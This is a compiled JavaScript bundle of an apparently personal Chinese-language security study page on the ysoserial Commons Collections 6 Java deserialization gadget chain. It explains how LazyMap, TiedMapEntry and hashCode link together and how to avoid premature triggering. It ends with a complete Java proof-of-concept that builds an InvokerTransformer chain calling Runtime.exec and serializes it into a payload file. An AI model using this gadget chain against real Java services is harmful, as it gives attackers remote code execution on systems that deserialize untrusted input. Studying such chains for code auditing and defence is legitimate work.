"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[6924],{6271:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>i,contentTitle:()=>o,default:()=>m,frontMatter:()=>c,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC6","title":"Apache Commons Collections 6","description":"[!Tip]","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/01.Java/02.ysoserial\u5229\u7528\u94fe/01.CC1-7/06.CC6.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/01.Java/02.ysoserial\u5229\u7528\u94fe/01.CC1-7","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC6","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC6","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/03.\u4ee3\u7801\u5ba1\u8ba1/01.Java/02.ysoserial\u5229\u7528\u94fe/01.CC1-7/06.CC6.md","tags":[],"version":"current","sidebarPosition":6,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Apache Commons Collections 3","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/CC1-7/CC3"},"next":{"title":"URLDNS","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u4ee3\u7801\u5ba1\u8ba1/Java/ysoserial\u5229\u7528\u94fe/URLDNS"}}');var t=a(4848),r=a(8453);const c={},o="Apache Commons Collections 6",i={},l=[{value:"\u5229\u7528\u94fe\u5206\u6790",id:"\u5229\u7528\u94fe\u5206\u6790",level:2},{value:"CC6\u5229\u7528\u6d41\u7a0b\u56fe",id:"cc6\u5229\u7528\u6d41\u7a0b\u56fe",level:2}];function p(e){const n={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"apache-commons-collections-6",children:"Apache Commons Collections 6"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"[!Tip]"}),"\n",(0,t.jsx)(n.p,{children:"\u8fd9\u6761\u94fe\u662f\u5229\u7528\u7684Map\u4e2d\u7684\u94fe\uff0c\u6240\u4ee5\u4e0d\u9650\u5236jdk\u7248"}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"\u5229\u7528\u94fe\u5206\u6790",children:"\u5229\u7528\u94fe\u5206\u6790"}),"\n",(0,t.jsxs)(n.p,{children:["\u4e0eCC1\u7684\u5165\u53e3\u4e00\u81f4\uff0c\u90fd\u662f",(0,t.jsx)(n.code,{children:"LazyMap.get()"}),"\uff0cCC6\u662f\u7531 ",(0,t.jsx)(n.code,{children:"TiedMapEntry"}),"\u7c7b\u4e2d\u7684",(0,t.jsx)(n.code,{children:"getValue"}),"\u65b9\u6cd5\uff0c\u5176\u4e2d\u7684map\u3001key\u90fd\u662f\u53ef\u4ee5\u63a7\u5236\u7684"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202303101124870.png-1",alt:"image-20230221105532474"})}),"\n",(0,t.jsxs)(n.p,{children:["\u800c\u5728 ",(0,t.jsx)(n.code,{children:"TiedMapEntry"}),"\u7c7b\u4e2d\uff0c\u53ef\u4ee5\u627e\u5230 hashCode \u4e2d\u8c03\u7528\u4e86 ",(0,t.jsx)(n.code,{children:"getValue"})," \uff0c\u800c\u6211\u4eec\u77e5\u9053URLDNS\u8fd9\u6761\u94fe\u4e5f\u662f\u5229\u7528\u7684",(0,t.jsx)(n.code,{children:"hashCode"})," \uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u6210\u529f\u5229\u7528\u8fd9\u6761\u94fe"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202303101124192.png-1",alt:"image-20230221110043135"})}),"\n",(0,t.jsx)(n.p,{children:"\u6ce8\uff1a\u8fd9\u91cc\u5b58\u5728\u4e24\u4e2a\u95ee\u9898"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["\u5728\u8fd9\u6761\u94fe\u4e2d\u8981\u60f3map\u4e2d\u6dfb\u52a0\u5143\u7d20\u4e5f\u4f1a\u89e6\u53d1",(0,t.jsx)(n.code,{children:"hash"})]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20230221110644953",src:a(8568).A+"",width:"745",height:"273"})}),"\n",(0,t.jsxs)(n.p,{children:["\u4e3a\u4e86\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\uff0c\u53ef\u4ee5\u5c06",(0,t.jsx)(n.code,{children:"Transformer"})," \u968f\u610f\u53d6\u503c\uff0c\u4e0d\u8ba9\u540e\u7eed\u94fe\u89e6\u53d1\u3002"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:"Map lazy = LazyMap.decorate(new HashMap<>(), new ConstantTransformer(1));\n"})}),"\n",(0,t.jsxs)(n.ol,{start:"2",children:["\n",(0,t.jsxs)(n.li,{children:["\u5e8f\u5217\u5316\u4e4b\u540e\uff0c\u4f1a\u5728map\u4e2d\u751f\u5b58\u4e00\u4e2a",(0,t.jsx)(n.code,{children:"key"}),"\uff0c\u5bfc\u81f4\u540e\u7eed\u65e0\u6cd5\u8fdb\u5165\u8fd9\u4e2aif\u8bed\u53e5\u4e2d"]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202303101124225.png-1",alt:"image-20230221111046190"})}),"\n",(0,t.jsx)(n.p,{children:"\u6240\u4ee5\u5728\u6210\u529fput\u4e4b\u540e\uff0c\u8981\u5220\u9664\u6dfb\u52a0\u7684key"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'map.put(tiedMap,"aaa");\nlazy.remove("cccc");\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u5b8c\u6574POC"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'package org.example;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.*;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    public static void main(String[] args) throws Exception {\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),\n                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        Map lazy = LazyMap.decorate(new HashMap<>(), new ConstantTransformer(1));\n        TiedMapEntry tiedMap = new TiedMapEntry(lazy,"cccc");\n        HashMap<Object, Object> map = new HashMap<>();\n        map.put(tiedMap,"aaa");\n        lazy.remove("cccc");\n        Class<? extends Map> aClass = lazy.getClass();\n        Field factory = aClass.getDeclaredField("factory");\n        factory.setAccessible(true);\n        factory.set(lazy,chainedTransformer);\n        serialize(map);\n        unserialize("ser.bin");\n    }\n\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {\n        ObjectInputStream objectInputStream = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));\n        return objectInputStream.readObject();\n    }\n    public static void serialize(Object obj) throws IOException {\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));\n        objectOutputStream.writeObject(obj);\n    }\n\n}\n'})}),"\n",(0,t.jsx)(n.h2,{id:"cc6\u5229\u7528\u6d41\u7a0b\u56fe",children:"CC6\u5229\u7528\u6d41\u7a0b\u56fe"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202303101124473.png-1",alt:"image-20230310112404524"})})]})}function m(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(p,{...e})}):p(e)}},8453:(e,n,a)=>{a.d(n,{R:()=>c,x:()=>o});var s=a(6540);const t={},r=s.createContext(t);function c(e){const n=s.useContext(r);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:c(e.components),s.createElement(r.Provider,{value:n},e.children)}},8568:(e,n,a)=>{a.d(n,{A:()=>s});const s=a.p+"assets/images/image-20230221110644953-771069075e9cc43d6e93973e50c6cf78.png"}}]);